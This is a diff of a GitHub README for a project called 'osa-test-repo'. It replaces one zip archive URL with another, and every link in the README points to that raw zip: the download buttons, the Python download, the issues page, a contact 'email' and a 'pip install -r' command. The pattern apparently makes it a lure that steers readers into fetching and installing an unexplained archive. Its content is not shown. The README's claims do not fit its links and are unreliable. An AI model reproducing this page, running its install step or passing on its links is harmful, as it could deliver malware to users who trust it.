@@ -6,11 +6,11 @@ Welcome to the **osa-test-repo**! This project provides a simple foundation for 
 
 ## 🔗 Download Here
 
-[![Download Now](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip)
+[![Download Now](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip)
 
 ## 📥 Download & Install
 
-To get started with **osa-test-repo**, visit our releases page to download the latest version. You can find it here: [Download the latest version](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip).
+To get started with **osa-test-repo**, visit our releases page to download the latest version. You can find it here: [Download the latest version](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip).
 
 ### Step-by-Step Download Instructions
 
@@ -30,7 +30,7 @@ To get started with **osa-test-repo**, visit our releases page to download the l
 
 - **Streamlined Project Structure**: The repository comes pre-structured, making it easy to add your code and resources.
 - **Version Control with Git**: Track changes to your project efficiently.
-- **Dependency Management**: Use `https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip` to manage any libraries your project needs.
+- **Dependency Management**: Use `https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip` to manage any libraries your project needs.
 - **Cross-Platform Support**: Whether you use Windows, macOS, or Linux, this project works for you.
 
 ## 📋 System Requirements
@@ -40,13 +40,13 @@ To successfully run **osa-test-repo**, ensure your environment meets the followi
 - Operating System: Windows 10 or later, macOS 10.14 or later, Ubuntu 20.04 or later
 - Minimum 2 GB of RAM
 - At least 250 MB of free disk space
-- Python 3.6 or later installed on your system; you can download it [here](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip).
+- Python 3.6 or later installed on your system; you can download it [here](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip).
 
 ## ⚙️ How to Use the Project
 
 1. After installing, open your terminal or command prompt.
 2. Navigate to the folder where you downloaded the project.
-3. Use `pip install -r https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip` to install the necessary libraries.
+3. Use `pip install -r https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip` to install the necessary libraries.
 4. You can now start developing your project!
 
 ## 🥇 Contributing
@@ -67,7 +67,7 @@ If you encounter issues while installing or running the software, please check t
 
 ## 📞 Support
 
-For further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip). You can also contact us via email at https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip 
+For further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip). You can also contact us via email at https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip 
 
 ## 📝 License
 
@@ -75,8 +75,8 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 🔗 Quick Links
 
-- [Download the latest version](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip)
-- [Contribute](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/repo_osa_test_v3.3.zip)
+- [Download the latest version](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip)
+- [Contribute](https://raw.githubusercontent.com/anudiip93/osa-test-repo/main/uneconomic/test_repo_osa_v2.5.zip)
 
 Explore **osa-test-repo** to enhance your software development experience!
